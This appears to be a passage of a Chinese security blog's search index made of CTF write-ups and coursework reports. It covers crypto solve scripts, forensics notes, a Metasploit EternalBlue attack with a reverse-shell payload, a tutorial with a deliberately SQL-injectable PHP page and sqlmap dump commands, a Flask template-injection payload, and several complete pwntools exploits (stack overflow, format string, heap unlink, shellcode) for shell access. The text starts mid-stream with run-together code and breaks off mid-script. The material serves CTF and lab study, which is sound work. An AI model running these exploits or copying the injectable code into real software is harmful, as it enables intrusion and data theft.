25197411503384438465457747778257828546056452288773844510523924632927812430649476760238174873630670747649726829664710227729046538241685027106636190022704674813914658555522704254026934170921180880364524978980605216421102751036031187837852845145176233340544629656075196693935478996314670725777034314862269533476603759021249576881724904714872278034418134979560765768103587371983746026587223025082701hint2=9228372398106611678286602895979417641404959178255543814408337636177265187498562357680073193750915958259886134885485814072189036077766844561767759359250327303362810094050654309593039106720830526510922411657244536811556192653039479590127726241656703727857177346638244353889205681446185783145149422115271311856344478861088252744224041700828934971839656845962952500398770632343211042957147026294673482712989723897728337948158121202913573351729397106490347537538903650384995023749669582138437808423835983027756877883503757939832290271053227076409279478395525689458736619490567940661071408166381129935073856561201013361053n2=23455941227615775239443656539308297643982180829894484654402049952011754902910673016959293180763361297198028854846363769063194531340669913995607156520854107236145047519578431507504734946246387233119717455988604342629143169157458584024447539175522986194131420361207058659457842367747225416115718224096447064601381167752066587897491480906570491639285673739647530780716845522767589953844752161693528538842719783969776712946980214527220333249829977678665044026275482383388141550463655788551517246509583964301299148891187023831298370935139952329286769019479750190899942260635809156294531533965944585308646875084207341309299c2=10715530306324673951548363119599726709032302490502503621262820402900708789479621786122202992270558740188089762633055937315273764776127007864314674666166396689989930966418725350921051566929420570800769227599053763394381881199633177787353312804172567883872711505640718496347152167195080365353610444414595776482688285765982794405522837470961426021769204869380013321460287585054427869064253751275281437353126670344963886123242042442941517661063614551338654515719677153884859086613947232523675577273003475854186999077452645748496990780555934158380320022165991608812421649555260206052852131416556798379301864938588470069672hint3=1654703003093197323980549268127925734263220180218064821197891025480097895203898772683216556991095679066676330439571583420844073504061955914501552694851614664535404506850987626495748207864609522112425305618610542301021476293897450207456755153556758668114136827972390250711416496872911351908708498414711360774971803573424205005228478582765383952861132873141928265470739139939621697690745206102955277335631722299407771944405392356152203059038634579646087719909219308328870723043866071044134819385941485815488954689419436803675260443857367260605145787282706903883937049863141720288267973088830357903178618320711954941279581318770659585316616595448063292922358711609246297827512125769079432138746015092937410075719218112875217464130311880766565746303930574642167673189222237455675759570092101319641817787110871628322729294716699165480945617248862043371295021999756247543649749491705260692788753355626196854460802924198436342429850#hint1 hint2t1=pow(hint1,321,n1)t2=pow(hint2,123,n1)x1=t1-t2x2=t2-t1xx = gmpy2.gcd(x2,n1)p1 = 111260936618891036068652208614496645952776413871721160526197362367054114767347494528257565447229196035984168278796498545668532710414950556409048002275825950676900234517459096095264009412617416429176073580216701699837149712564123810225413587649986801062654943062839747848949602864178056960224292368694023834399e1 = 264769q1 = n1//p1p1 = mpz(p1)q1 = mpz(q1)e1 = mpz(e1)phi1 = (q1-1) * (p1-1) d1 = gmpy2.invert(e1, phi1)p = pow(c1,d1,n1)print(p)q = n//p#print(isPrime(p))#print(isPrime(q))e = 65537p = mpz(p)q = mpz(q)e = mpz(e)phi = (p - 1) * (q - 1)d = gmpy2.invert(e, phi)m = pow(c,d,n)print(long_to_bytes(m)) baby_dsafrom Crypto.Util.number import *from hashlib import sha512,md5def hash(message): return int(sha512(message).hexdigest(), 16)def sign(message, pubkey, privkey, random1): p, q, g, y = pubkey x = privkey k = pow(y, x, g) * random1 % q r = pow(g, k, p) % q s = inverse(k, q) * (hash(message) + x * r) % q return r, spublic = (3297226463037324458008837284498963372649038889390685051849680175016505646001761220109858921624266044035133134135402561235635833428206886888308027772353030767400921078346868377298401213812053250316002033941692272192644613252296579884516731560436501073253924457646558698855484781747029397755111633297587215976579633451933658235385386539518006570069653575146060016811911140614606471930327341368582979836042585406811352236326065292636484550807213756482153084427714549694264685695977531537425682212155553568848666088576932888234659355213664909753781753917401161977762663658097504411914908081677033980915039079517766159760522261279115347385813009437510156898969769563687869495721977265444799585634019880951532080217960456901788918439265788169910062822889580199366417455186595489973000351770200485095008494228829300145039695936946379585625051402553034971207474762463147744467360158847593356030745194143276254949463650698210515569533, 82302835442112137125891403368151249910268706824854786126600390413622302196443, 1156233264299340971106498371495495695225880592354374034142195518472540521911699506391311324676590685365234887170345722135060009885002334748836477169806166169806180231794918961214520698361874839110454610266388341977984902756569838594616255112661600466818870137432772800368859461445854700956291885576855069405183771903076277144927769029433730710613058788277691211698675287829143272152835171859480781061918556840079857761203012054552142555673071865310355331986288606422711525790877591376770834180618492794265362178603111236615495225612101250344421932588038244804199229449738675082560512062564365473035097263889257937140778993389305893378514344032352806521972367991027459721160744835688761657797398841523104074451793557924512992305640697344011520550723893828185707635141404445213445935586965289450282024222064488965878769991566367115153619761583843561579531705057955933288008556165952066173304891391375100346312776539530448611005, 290999623787731812697719691852061290246619413463636312382146969900546384514710782843153962704851916091601679028830866176332331519515156301401537173069908181509028464322647352256632424684809349121024262597006913707483811117644197481959053785475083406472583099140506505071300193356002443007750220524932219191932969202270343323955035291396808472686684787610559114702054784699365490860392737061056233160308943296478540798353134878937088336672928162894332961762277559345860479916248086821117811990391025187125193074059001086441305977133252774698996653122297123447837449168657347308016270030881395674066421144002959751936839166935726200833785132736328859710351871352567511516142170956091885352178579302299634322254818383978585773136692588922976043617337904545396146755609284163743476297772686548475170197605412847689587171522453229055932712714154869989454808561458852031769119489235598402066924082778376081494632258448434048562053)p, q, g, y = public[0], public[1], public[2], public[3]tmp1 = (b'0234e7971889def7e60348f77db94b7a', (10859236269959765735236393779936305217305574331839234502190226708929991582386, 13707557323895695260471053137828523837745895683218331343360027380310980108819))tmp2 = (b'16c5ac270b72f70319657b4410d985d4', (41960642246379067640524709416001536058292817319109764317369777224426218746518, 74676725322515593502346275468843411563746982149373670021082686341369076719088))message1, r1, s1 = tmp1[0], tmp1[1][0], tmp1[1][1]message2, r2, s2 = tmp2[0], tmp2[1][0], tmp2[1][1]hm1, hm2 = hash(message1), hash(message2)#print(hm1, hm2)for random1 in range(1, 512): for random2 in range(1, 512): random1_inv = inverse(random1, q) random_mul = random1_inv * random2 x = (s1 * hm2 - s2 * hm1 * random_mul) * inverse(s2 * r1 * random_mul - s1 * r2, q) x = x % q #print(x) #print(sign(message1, public, x, random1)) #print(tmp1[1]) if sign(message1, public, x, random1) == tmp1[1]: print(x) flag = 'flag&#123;'+md5(long_to_bytes(x)).hexdigest()+'&#125;' print(flag) print(random2) print(random1) MISC签到{echo,ZmxhZ3t3MzFjMG1lNX0=}|{base64,-d}|{tr,5,6}bash 执行 pcapframe.len == 91 慢慢找 得到`flag{d989e2b92ea671f5d30efb8956eab1427625c}` pcap analysis先查modbus,发现有个长度为65,其他都62,与上题基本一样。 接着直接查frame.len == 65,拼接得到flag flag{323f986d429a689d3b96ad12dc5cbc701db0af55}","categories":[{"name":"CTF","slug":"CTF","permalink":"https://github.com/gha01un/gha01un.github.io/categories/CTF/"}],"tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/gha01un/gha01un.github.io/tags/RE/"}],"author":"H1un"},{"title":"网安作业报告1","slug":"2020-07-21-网安作业报告1--利用msfconsole攻击win7x64永恒之蓝漏洞","date":"2020-11-19T11:38:56.022Z","updated":"2020-11-21T14:20:05.142Z","comments":true,"path":"2020/11/19/2020-07-21-网安作业报告1--利用msfconsole攻击win7x64永恒之蓝漏洞/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2020/11/19/2020-07-21-%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A%E6%8A%A5%E5%91%8A1--%E5%88%A9%E7%94%A8msfconsole%E6%94%BB%E5%87%BBwin7x64%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E/","excerpt":"网安报告1–利用msfconsole攻击win7x64永恒之蓝漏洞","text":"网安报告1–利用msfconsole攻击win7x64永恒之蓝漏洞 0x01 实验准备首先我们要准备的环境是kali（攻击方），一台win7虚拟机（靶机），我用的是kali19.04和win7x64。由于要获得对方靶机的shell，所以两台电脑的IP我们都要知道，因为之后会用上。因为我的虚拟机当时应该是在同一个网络环境下配置的，所以肯定是互通信道的。 0x02 IP查询kali查询IP： ip add 这里查到我们kali的ip为192.168.175.129 win7查询IP： ipconfig 为了确保攻击的成功，首先我们关闭win7的防火墙，其次把所有的补丁都卸掉。win7的防火墙关闭方法，搜索防火墙，找到相关设置，关掉它。之后就是补丁，很多我们找到的镜像都打过永恒之蓝的补丁，所以我们要稍微的关一下。 我们先在kali上跑一下nmap，一是看看445端口是不是已经开放，二来是看看局域网中两台机子是否连接正常。 nmap -Fn 192.168.175.134 0x03 msfconsole的配置与使用其实步骤与书上的步骤差不多，但是由于书上是对XP系统进行的攻击，所以使用的漏洞是ms08-067。但是我们是对win7的漏洞进行攻击，所以在第一步就有了一点点区别，我们需要使用的漏洞是ms17_010。 首先我们启动msf msfconsole 然后就是search模块 search ms17_010 注释1：auxiliary/scanner/smb/smb_ms17_010 ：一个检测程序，设置目标主机，网段，它会自动检测是否存在永恒之蓝漏洞 注释2：exploit/windows/smb/ms17_010_eternalblue： 永恒之蓝的exp 紧接着是auxiliary/scanner/smb/smb_ms17_010的检验： use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010set RHOSTS 192.168.175.134run 配置IP后就可以运行这个模块。 192.168.175.134:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit) 发现是永恒之蓝漏洞，下面我们就开始组装exp与payload。 use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue &#x2F;&#x2F;进入exp模块set RHOSTS 192.168.175.134 &#x2F;&#x2F;配置目标IPset Lhost 192.168.175.129 &#x2F;&#x2F;配置本机IPset payload windows&#x2F;x64&#x2F;shell_reverse_tcp &#x2F;&#x2F;payload 此时我们就完成了基本步骤。 win7全版本通用 0x04 攻击exploit 当你看见如上情况的时候，说明攻击成功了。","categories":[{"name":"Study","slug":"Study","permalink":"https://github.com/gha01un/gha01un.github.io/categories/Study/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://github.com/gha01un/gha01un.github.io/tags/AI/"}],"author":"H1un"},{"title":"sql注入---从0开始搭网站","slug":"sql注入---从0开始搭网站","date":"2020-10-26T03:58:29.248Z","updated":"2020-10-26T06:19:12.044Z","comments":true,"path":"2020/10/26/sql注入---从0开始搭网站/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2020/10/26/sql%E6%B3%A8%E5%85%A5---%E4%BB%8E0%E5%BC%80%E5%A7%8B%E6%90%AD%E7%BD%91%E7%AB%99/","excerpt":"随便搭","text":"随便搭 0x01 什么是phpstudyphpStudy是一个PHP调试环境的程序集成包。该程序包集成最新的Apache+PHP+MySQL+phpMyAdmin+ZendOptimizer，一次性安装，无须配置即可使用，是非常方便、好用的PHP调试环境。该程序不仅包括PHP调试环境，还包括了开发工具、开发手册等。 0x02 配置环境打开phpstudy ，把Apache和MySQL服务打开即可，配置完毕。 0x03 WWW找到安装phpstudy的目录，找到www目录，在这里我写了一个php文件如下，不多解释，代码有注释而且很简单！ &lt;?php$db['host'] = '127.0.0.1';$db['port'] = '3306';$db['username'] = 'root';$db['password'] = 'root';$db['database'] = '2015kdctf_sqlsql';function mysql_connect($host, $user, $passwd,$database) //定义数据库连接函数&#123; return mysqli_connect($host, $user, $passwd,$database);&#125;function mysql_fetch_assoc($result) //把查询结果转换成数组&#123; return mysqli_fetch_assoc($result);&#125;function mysql_query($sql, $cxn) //执行sql查询的语句&#123; $a = mysqli_query($cxn, $sql); return $a;&#125;$link = mysql_connect($db['host'] . ':' . $db['port'], $db['username'], $db['password'],$db[\"database\"]); //连接数据库 function getData($sql)&#123; global $link; //全局变量 $r = mysql_query($sql,$link); // $result = array(); if ($r) &#123; //查询 while ($row = mysql_fetch_assoc($r)) &#123; $result = $row; &#125; return $result; &#125; return false;&#125;$sql=\"select * from type where id=\".$_GET['id'];$a=getData($sql);var_dump($a);echo \"Welcome\";?&gt; 这里放一下搭好的网站页面！ 0x04 Connect to database 找到这个路径E:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\bin，打开CMD,输入命令和密码，连接成功。 mysql.exe -h localhost -u root -p 查看一下自己传的数据库并使用这个数据库 show databases；use 2015kdctf_sqlsql； 查看数据库列表 show tables； image-20201026114331566 使用数据库查表语句 select * from type; 也可以具体查看 select * from type where id&#x3D;1; 到这里数据库里的东西就被我们知道的一清二楚了，最后我们可以去验证一下在sqlmap下是否可以进行注入呢！ 0x05 sqlmap注入又特么回到了sqlmap注入，劳资不想注了，但是还是得给它写完！🤮 来吧，跟上次的有所不同，这次我是在Windows环境下注入，下一个sqlmap安装到自己的python2.7路径下，我的路径是C:\\python27-x64\\sqlmap\\sqlmapproject-sqlmap-5029d67。这里不知道为什么多了一个文件夹，可能当时没有解压好吧。 在这个路径下，打开CMD，还是那些熟悉的命令！首先指定要注入的URL; sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;66.php?id&#x3D;1&quot; 然后呢然后呢！注吐了要 sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;66.php?id&#x3D;1&quot; --dbs 再然后呢再然后呢 sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;66.php?id&#x3D;1&quot; --current-db 继续 sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;66.php?id&#x3D;1&quot; -D 2015kdctf_sqlsql --tables gogogogo on sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;66.php?id&#x3D;1&quot; -D 2015kdctf_sqlsql -T type --columns final final sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;66.php?id&#x3D;1&quot; -D 2015kdctf_sqlsql -T type -C id,name --dump 搞完了搞完了！ 0x06 总结扯了三周，终于把sql注入搞完了，天啊，我太菜了我爬！当然还有很多注入方式和命令在这里就不一一演示了 这里有一个sqli的github链接https://github.com/Audi-1/sqli-labs，可以在本地上搭建试试，很容易上手的（我已经替大家试过了）。 OK，就这样结束吧，希望这篇文章能对大家网络安全的作业有帮助吧……","categories":[{"name":"CTF","slug":"CTF","permalink":"https://github.com/gha01un/gha01un.github.io/categories/CTF/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://github.com/gha01un/gha01un.github.io/tags/Web/"}],"author":"H1un"},{"title":"CUMTCTF2020-WP by Q1RG","slug":"华为杯","date":"2020-10-23T12:50:30.880Z","updated":"2020-11-23T13:36:36.569Z","comments":true,"path":"2020/10/23/华为杯/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2020/10/23/%E5%8D%8E%E4%B8%BA%E6%9D%AF/","excerpt":"2020 华为杯","text":"2020 华为杯 密码Classical一个txt文件 维吉尼亚无密钥 在线工具直接拿到flag ezRSA给了大数n，想到winerattack，上脚本求d，然后解m import gmpy2from Crypto.Util.number import *from gmpy2 import *n = 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597e = 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619d= 8264667972294275017293339772371783322168822149471976834221082393409363691895c = 235079473042454099807116076488262740135383858230967099540307826273199444131724945298259060669497025680602868465015609167157760611830665379910856647739895018654389167886359502125262006498872925841789249028759026079722290718145036644959479543255350040619949567107916725017078853648984759794085772688267388901151m = pow(c,d,n)print(long_to_bytes(m)) MiscSign InBase64解码 Brainfuck to text ](https://i.loli.net/2020/10/23/x4w8v9rHElj3Yam.jpg)![ 出个流量分析吧放入WIRESHARK .搜FLAG 出个LSB吧STEGSOLVE 重新保存得到二维码扫码即可。 出个伪WEB吧通过时间找到2020年的作为线索，然后直接找到类似字符串。 出个文档吧word隐写，在选项里找隐藏文字 出个压缩包吧在winhex中修改，7A改成74 ，在stegsolve中发现两个一半的二维码，用ps拼到一起就行了 出个内存取证吧volatility imageinfo -f 1.img volatility filescan -f 1.img --profile&#x3D;Win2003SP1x86 | grep flag 查看一下文件并匹配一下flag 发现flag.png,dump出来 扫码得到：jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4= 系统里的窗口列表： volatility -f 1.img --profile&#x3D;Win2003SP1x86 windows 看到 flag.png 是由 explorer.exe 进程里的 Windows 图片查看器打开的。查看内存并把explorer.exe dump： volatility -f 1.img --profile&#x3D;Win2003SP1x86 pslist explorer.exe 这个进程的内存试试，pid 为 1992。 volatility -f 1.img --profile&#x3D;Win2003SP1x86 memdump -p 1992 -D .&#x2F; 对dump出的文件使用binwalk分离出来png 还有 key 和 iv aes 加密 密文：jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4=key: Th1s_1s_K3y00000iv: 1234567890123456 WEBFLASK模板注入 ‘’[http:&#x2F;&#x2F;202.119.201.199:9001&#x2F;name&#x3D;%7B%7B().__class__.__bases__.__getitem__(0)%7D%7D](http:&#x2F;&#x2F;202.119.201.199:9001&#x2F;name&#x3D;&#123;&#123;().__class__.__bases__.__getitem__(0)&#125;&#125;)[http:&#x2F;&#x2F;202.119.201.199:9001&#x2F;name&#x3D;%7B%7B](http:&#x2F;&#x2F;202.119.201.199:9001&#x2F;name&#x3D;&#123;&#123;)&#39;&#39;‘’.class.mro.getitem(2).subclasses().pop(40)(&#39;&#x2F;flag&#39;).read()%7D%7D 本地按照常规思路想要LS一下，但是发现IMPORT,FNC,OS等都被办了，绕过实在绕不过去，看到最下边学长写到看看HOME，直接盲猜/flag，得到最终flag。 image-20201023205000472 DOGEF12有一大串代码，放入控制台，得到BASE64,然后解码（貌似直接抽也可以，看运气）。 REhello_world关键点在如下的语句上 if ( (_BYTE)a2 != ((unsigned __int8)a1 ^ (unsigned __int8)aIsEasyRight[i % strlen(a1)]) )&#123; sub_401530(); printf(a1, a2, v4, \"wrong!!!\"); return 0LL;&#125; 根据判断条件逆向求解flag即可 EXP: a = [0x2a,0x26,0x12,0x31,0x1a,0x7,0x11,0x3a,0x2d,0x0f,0x0e,0x1a,0x41,0x4b,0x36,0x43,0x31,0x0,0x3e,0x16,0x17,0x35,0x1d,0x10,0x38,0x11,0x44,0x4a,0x1b,0x2c,0x2b,0x17,0x50,0x3,0x4]b = 'is_easy_right?'s = ''for i in range(35): s+=chr(a[i]^ord(b[i%14]))print s fangcheng这个题基本逻辑就是一个解方程的题目 for ( i = 0; i &lt;= 3; ++i )&#123; dword_407044 = 0; for ( j = 0; j &lt;= 3; ++j ) dword_407044 += byte_403010[4 * i + j] * byte_40703E[j]; if ( dword_403020[i] != dword_407044 ) return 0LL;&#125; 在线解方程，求得4个解为 116,103,102,114 flag即为四个解的十六进制再加上flag{} PWNlogin利用栈溢出修改返回地址，控制程序流，获取shellEXP: #!/usr/bin/python#coding=utf-8from pwn import *p = remote('219.219.61.234','10000')p.recvuntil('choice: ')p.sendline('1')p.recvuntil('gth less than 20):\\n')payload = 'a'*0x20+'a'*0x8+p64(0x4009F7)p.sendline(payload)p.recvuntil('password(length less than 20):\\n')p.sendline('aaa')p.interactive() login_plus整数溢出漏洞，输入0x100000000，即4294967296就可以获取shell note-service拖入IDA中查看反汇编代码可以看到非常明显的格式化字符串漏洞，再查看一下保护机制 [*] &#39;&#x2F;root&#x2F;ctf&#x2F;note_service&#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 保护全开，在这种条件下有两种方法 第一种是泄露栈地址，通过格式化字符串漏洞修改返回地址控制程序流，从而拿到shell 第二种是通过修改__free_hook为one_gadget以获取shell 这里只演示第一种，基本思路是通过格式化字符串漏洞获取__libc_start_main的地址，从而获取libc基地址，构造one_gadget，然后泄露栈地址，通过gdb调试获取泄露的栈地址与返回地址的偏移值，在通过格式化字符串漏洞的任意地址写功能修改返回地址，获取shellEXP: #!/usr/bin/python#coding=utf-8from pwn import *context.log_level = 'debug'context.terminal = ['gnome-terminal','-x','sh','-c']elf = ELF('./note_service')if args['REMOTE']: p = remote('219.219.61.234',10002)else: p = process('./note_service')p.recvuntil('input your name:\\n')p.sendline('aaa')p.recvuntil('input your note:\\n')p.sendline('%41$p')p.recvuntil('your note is:\\n')ptr = int(p.recvuntil('\\n',drop=True)[2:],16)-231libc_base = ptr - 0x21ab0system = libc_base+0x4f2c5log.info(hex(ptr))p.recvuntil('is right????\\n')p.sendline('no')p.recvuntil('input your note:\\n')p.sendline('%38$p')p.recvuntil('your note is:\\n')stack = int(p.recvuntil('\\n',drop=True)[2:],16)-496+0x118log.info(hex(ptr))p.recvuntil('is right????\\n')p.sendline('no')p.recvuntil('input your note:\\n')o1 = (0x100+int(hex(system)[-2:],16))&amp;0xffo2 = (0x100-(o1)+int(hex(system)[-4:-2],16))&amp;0xffo3 = (0x100-((o1+o2)&amp;0xff)+int(hex(system)[-6:-4],16))&amp;0xffo4 = (0x100-((o1+o2+o3)&amp;0xff)+int(hex(system)[-8:-6],16))&amp;0xffo5 = (0x100-((o1+o2+o3+o4)&amp;0xff)+int(hex(system)[-10:-8],16))&amp;0xffo6 = (0x100-((o1+o2+o3+o4+o5)&amp;0xff)+int(hex(system)[-12:-10],16))&amp;0xffpayload = '%&#123;&#125;c%&#123;&#125;$hhn%&#123;&#125;c%&#123;&#125;$hhn%&#123;&#125;c%&#123;&#125;$hhn%&#123;&#125;c%&#123;&#125;$hhn%&#123;&#125;c%&#123;&#125;$hhn%&#123;&#125;c%&#123;&#125;$hhn'.format(o1,18,o2,19,o3,20,o4,21,o5,22,o6,23).ljust(0x60,'a')payload += p64(stack)+p64(stack+1)+p64(stack+2)+p64(stack+3)+p64(stack+4)+p64(stack+5)log.info(hex(system))log.info(hex(stack))log.info(payload)p.sendline(payload)p.recvuntil('is right????\\n')p.sendline('yes')p.interactive() messagesystem查看保护机制 [*] &#39;&#x2F;root&#x2F;ctf&#x2F;messagesystem&#39; Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 基本思路是泄露libc基地址，构造fake_chunk，利用unlink机制，实现任意地址读写，修改free@got为system函数，这里还要注意绕过tcache机制EXP: #!/usr/bin/python#coding=utf-8from pwn import *context.terminal = ['gnome-terminal','-x','sh','-c']context.binary = './messagesystem'if args['REMOTE']: p = remote('219.219.61.234','10003')else: p = process('./messagesystem')context.log_level = 'debug'elf = ELF('./messagesystem')free_got = elf.got['free']def leave(idx,size,payload): p.recvuntil('choice: ') p.sendline('1') p.sendlineafter('Enter your Message id!(0-15)\\n',str(idx)) p.sendlineafter('How many character do you want to leave?\\n',str(size)) p.recvuntil('What do you want to say?\\n') p.send(payload)def show(idx): p.recvuntil('choice: ') p.sendline('2') p.sendlineafter('Which Message do you want to show?\\n',str(idx))def delete(idx): p.recvuntil('choice: ') p.sendline('3') p.sendlineafter('Which Message do you want to delete?\\n',str(idx))def edit(idx,payload): p.recvuntil('choice: ') p.sendline('4') p.sendlineafter('Which Message do you want to edit?\\n',str(idx)) p.recvuntil('Now enter your Message!\\n') p.send(payload)def main(): leave(0,0x80,'aaa') leave(1,0x80,'bbb') leave(2,0x40,'/bin/sh\\x00') delete(0) payload = (p64(0)+p64(0x81)+p64(0x601560-0x18)+p64(0x601560-0x10)).ljust(0x80,'\\x00')+p64(0x80)+p64(0x90) leave(0,0x80,payload) #gdb.attach(p) for i in range(7): leave(i+3,0x80,'aaa') for i in range(7): delete(i+3) delete(1) payload = p64(0)*3+p64(free_got) edit(0,payload) show(0) free_addr = u64(p.recvn(8)) print hex(free_addr) log.info(hex(free_addr)) libc_base = free_addr-0x97950 system_addr = libc_base+0x4f440 edit(0,p64(system_addr)) delete(2) p.interactive()if __name__ == \"__main__\": main() not_implemented_login_service程序没有开启数据段不可执行保护 [*] &#39;&#x2F;root&#x2F;ctf&#x2F;login&#39; Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments 因此基本思路是像数据段输入shellcode，利用栈溢出漏洞修改程序返回地址到shellcode，从而执行恶意代码，获取shellEXP: #!/usr/bin/python#coding=utf-8from pwn import *context.log_level = 'debug'if args['REMOTE']: p = remote('219.219.61.234',10004)else: p = process('./login')elf = ELF('./login')shellcode = '\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05'p.sendlineafter('input your username:\\n',shellcode)payload = 'pwnht\\x00'+'a'*0x12+p64(0x601060)p.sendlineafter('input your password:\\n',payload)p.recvuntil('bye bye\\n')p.interactive() 这里还得要注意绕过密码验证，因此构造payload时，要加上pwnht\\x00来绕过密码验证 messagesystem_plus这一题和前一题messagesystem基本相似，就多了个绕过tcacheEXP: #!/usr/bin/python#coding=utf-8from pwn import *context.terminal = ['gnome-terminal','-x','sh','-c']context.binary = './messageSystem_plus'if args['REMOTE']: p = remote('219.219.61.234','10005')else: p = process('./messageSystem_plus')context.log_level = 'debug'elf = ELF('./messageSystem_plus')free_got = elf.got['free']def leave(idx,size,payload): p.recvuntil('choice: ') p.sendline('1') p.sendlineafter('Enter your Message id!(0-15)\\n',str(idx)) p.sendlineafter('How many character do you want to leave?\\n',str(size)) p.recvuntil('What do you want to say?\\n') p.send(payload)def show(idx): p.recvuntil('choice: ') p.sendline('2') p.sendlineafter('Which Message do you want to show?\\n',str(idx))def delete(idx,*param): p.recvuntil('choice: ') p.sendline('3') p.sendlineafter('choice: ',str(idx)) if idx==1: for i in range(len(param)): p.sendlineafter('Which Message do you want to delete?\\n',str(param[i])) p.sendlineafter('Which Message do you want to delete?\\n','-1') else: p.sendlineafter('Which Message do you want to delete?\\n',str(param[0]))def edit(idx,payload): p.recvuntil('choice: ') p.sendline('4') p.sendlineafter('Which Message do you want to edit?\\n',str(idx)) p.recvuntil('Now enter your Message!\\n') p.send(payload)def main(): leave(0,0x80,'aaa') leave(1,0x80,'bbb') leave(2,0x40,'/bin/sh\\x00') delete(2,0) payload = (p64(0)+p64(0x81)+p64(0x6017A0-0x18)+p64(0x6017A0-0x10)).ljust(0x80,'\\x00')+p64(0x80)+p64(0x90) leave(0,0x80,payload) #gdb.attach(p) for i in range(7): leave(i+3,0x80,'aaa') for i in range(7): delete(2,i+3) delete(2,1) payload = p64(0)*3+p64(free_got) edit(0,payload) show(0) free_addr = u64(p.recvn(8)) print hex(free_addr) log.info(hex(free_addr)) libc_base = free_addr-0x97950 system_addr = libc_base+0x4f440 edit(0,p64(system_addr)) delete(2,2) p.interactive()if __name__ == \"__main__\": main() mail_service查看保护机制 [*] &#39;&#x2F;root&#x2F;ctf&#x2F;mail_service&#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 这道题的基本思路是，首先通过UAF漏洞获取unsorted_bin的地址，从而泄露libc的基地址。由于每次留下邮件都会创建两个堆。第一个堆是一个结构体,内容如下，大小为0x40 struct mail_list&#123; char receiver[16]; char title[16]; heap * ptr; long long length;&#125; 第二个堆的大小可控，因此我们可以构造一个假的mail_list结构体，free掉它，然后通过修改fd指针修改tcache中的下一个堆块，以至于当我们分配一个新的mail_list结构体堆时，系统会把我们构造假的mail_list结构体分配给程序，此时由于UAF漏洞的存在使得我们可以修改mail_list中指向邮件内容的指针，从而造成任意地址读写。然而由于程序开启了Full RELRO，所以got表不可写，考虑通过libc中的__environ变量泄露栈地址，通过gdb调试确定返回地址的偏移，从而修改返回地址，控制程序流。EXP: #!/usr/bin/python#coding=utf-8from pwn import *context.terminal = ['gnome-terminal','-x','sh','-c']context.binary = './mail_service'if args['REMOTE']: p = remote('219.219.61.234','10006')else: p = process('./mail_service')context.log_level = 'debug'elf = ELF('./mail_service')def add_mail(idx,receiver,title,length,context): p.sendlineafter('your choice:\\n','1') p.sendlineafter('your mail index:\\n',str(idx)) p.recvuntil('input your receiver:\\n') p.send(receiver.ljust(0x10,'\\x00')) p.recvuntil('input your title:\\n') p.send(title.ljust(0x10,'\\x00')) p.recvuntil('input your mail length:\\n') p.sendline(str(length)) p.recvuntil('input your mail context:\\n') p.send(context)def show_mail(idx): p.sendlineafter('your choice:\\n','2') p.sendlineafter('your mail index:\\n',str(idx))def remove_mail(idx): p.sendlineafter('your choice:\\n','3') p.sendlineafter('your mail index:\\n',str(idx))def edit_mail(idx,receiver,title,context): p.sendlineafter('your choice:\\n','4') p.sendlineafter('your mail index:\\n',str(idx)) p.recvuntil('input your receiver:\\n') p.send(receiver.ljust(0x10,'\\x00')) p.recvuntil('input your title:\\n') p.send(title.ljust(0x10,'\\x00')) p.recvuntil('input your mail context:\\n') p.send(context)def main(): p.recvuntil('your choice:\\n') p.sendline('1') p.sendafter('input your name:\\n','/bin/sh\\x00'.ljust(0x10,'\\x00')) p.sendafter('input your password:\\n','/bin/sh\\x00'.ljust(0x10,'\\x00')) p.recvuntil('your choice:\\n') p.sendline('2') p.sendafter('input your name:\\n','/bin/sh\\x00'.ljust(0x10,'\\x00')) p.sendafter('input your password:\\n','/bin/sh\\x00'.ljust(0x10,'\\x00')) add_mail(0,'agx','agxaa',0x30,'agxaaagxaa') add_mail(1,'agx','agxaa',0x80,'agxaa') add_mail(2,'agx','agxaa',0x10,'agxaa') for i in range(7): remove_mail(1) remove_mail(1) show_mail(1) p.recvuntil('context is: ') malloc_hook = u64(p.recvuntil('\\n',drop=True).ljust(8,'\\x00'))-96-0x10 log.info(hex(malloc_hook)) libc_addr = malloc_hook -0x3ebc30 one_gadget = libc_addr+0x4f322 environ = libc_addr+0x3ee098 remove_mail(0) show_mail(0) p.recvuntil('context is: ') heap_1 = u64(p.recvuntil('\\n',drop=True).ljust(8,'\\x00')) log.info(hex(heap_1)) 